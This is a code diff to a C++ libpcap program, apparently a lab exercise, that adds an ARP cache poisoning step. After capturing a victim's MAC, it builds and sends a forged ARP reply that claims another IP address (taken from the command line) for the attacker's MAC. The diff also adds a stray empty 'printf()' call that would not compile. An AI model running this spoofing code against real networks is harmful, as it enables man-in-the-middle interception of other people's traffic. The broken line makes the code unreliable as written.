@@ -118,14 +118,41 @@ int main(int argc, char* argv[]) {
 		printf("ARP reply captured\n");
 
 		EthArpPacket* victim_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));
+
+		printf()
 		
 		if (victim_packet->arp_.sip_ == packet.arp_.tip_ && victim_packet->eth_.type_ == htons(EthHdr::Arp) && victim_packet->arp_.op_ == htons(ArpHdr::Reply)) {
 			Mac victim_mac = victim_packet->arp_.smac_;
 			printf("Victim's MAC address: %s", std::string(victim_mac).c_str());
+
+			EthArpPacket packet2;
+
+			packet2.eth_.dmac_ = Mac(victim_mac);
+			packet2.eth_.smac_ = Mac(attacker_mac);
+			packet2.eth_.type_ = htons(EthHdr::Arp);	
+
+			packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
+			packet2.arp_.pro_ = htons(EthHdr::Ip4);
+			packet2.arp_.hln_ = Mac::SIZE;
+			packet2.arp_.pln_ = Ip::SIZE;
+			packet2.arp_.op_ = htons(ArpHdr::Reply);
+			packet2.arp_.smac_ = Mac(attacker_mac);
+			packet2.arp_.sip_ = htonl(Ip(argv[3]));
+			packet2.arp_.tmac_ = Mac(victim_mac); // Unknown MAC address
+			packet2.arp_.tip_ = htonl(Ip(argv[2])); // Victim's IP address
+
+			int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
+			if (res2 != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
+				return -1;
+			}
+
 			break;
 		}
 		printf("Not an ARP reply packet\n");
 	}
+
+	
 
 	pcap_close(handle);
 }
